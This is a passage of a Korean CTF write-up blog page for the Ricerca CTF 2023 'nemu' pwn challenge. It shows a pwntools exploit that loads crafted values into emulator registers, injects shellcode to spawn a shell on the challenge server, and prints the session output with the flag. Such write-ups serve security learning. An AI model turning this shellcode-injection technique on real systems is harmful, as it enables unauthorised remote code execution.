+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;nemu.2023.ricercactf.com&quot;</span>, <span class="number">9002</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">imm</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;#&quot;</span>+<span class="built_in">str</span>(imm))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">reg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;r&quot;</span>+<span class="built_in">str</span>(reg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inc</span>(<span class="params">reg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;r&quot;</span>+<span class="built_in">str</span>(reg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbl</span>(<span class="params">reg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;r&quot;</span>+<span class="built_in">str</span>(reg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addi</span>(<span class="params">imm</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;#&quot;</span>+<span class="built_in">str</span>(imm))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">reg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;opcode: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;r&quot;</span>+<span class="built_in">str</span>(reg))</span><br><span class="line"></span><br><span class="line">load(<span class="number">0x92f78748</span>)</span><br><span class="line">mov(<span class="number">3</span>)</span><br><span class="line">load(<span class="number">0xe6ff050f</span>)</span><br><span class="line">mov(<span class="number">2</span>)</span><br><span class="line">load(<span class="number">0xe7ff0000</span>)</span><br><span class="line">mov(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    dbl(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">addi(<span class="number">0x28c88348</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">r.sendline(asm(shellcraft.sh()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>기존에 존재하던 write-up을 거의 베꼈다. 하지만 쉘코드만 실행시키게 하면 OK 이기 때문에, 쉘코드를 작성하는 부분은 맘대로 해주면 될 것이다</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to nemu.2023.ricercactf.com on port 9002: Done</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendlineafter(&quot;opcode: &quot;, &quot;1&quot;)</span><br><span class="line">/home/p0her/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&quot;#&quot;+str(imm))</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendlineafter(&quot;opcode: &quot;, &quot;2&quot;)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&quot;r&quot;+str(reg))</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendlineafter(&quot;opcode: &quot;, &quot;4&quot;)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&quot;r&quot;+str(reg))</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendlineafter(&quot;opcode: &quot;, &quot;5&quot;)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&quot;#&quot;+str(imm))</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendlineafter(&quot;opcode: &quot;, &quot;6&quot;)</span><br><span class="line">/home/p0her/CTF/ricersaCTF/pwn/nemu/solve.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  r.sendline(&quot;r&quot;+str(reg))</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">operand: $ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag-66c43fe859fb1b3af1c8d7f2aa4e98d3.txt</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat flag-*</span><br><span class="line">RicSec&#123;me0w_i_am_n3mu_n3mu_c4tt0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag가 성공적으로 나오게 된다.%</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">2.</span> <span class="toc-text">exploit</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&text=Ricerca CTF 2023 nemu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&is_video=false&description=Ricerca CTF 2023 nemu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ricerca CTF 2023 nemu&body=Check out this article: http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&title=Ricerca CTF 2023 nemu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&name=Ricerca CTF 2023 nemu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/01/Ricerca-CTF-2023-nemu/&t=Ricerca CTF 2023 nemu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p0her
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
